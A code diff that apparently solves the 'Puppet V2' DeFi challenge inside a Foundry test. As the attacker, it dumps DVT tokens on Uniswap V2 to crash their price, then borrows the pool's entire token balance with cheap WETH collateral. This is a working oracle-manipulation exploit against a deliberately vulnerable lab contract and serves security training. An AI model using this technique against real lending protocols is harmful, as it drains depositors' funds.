@@ -104,6 +104,23 @@ contract PuppetV2 is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 1, path, attacker, block.timestamp + 1
+        );
+
+        weth.deposit{value: attacker.balance}();
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);     
+
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
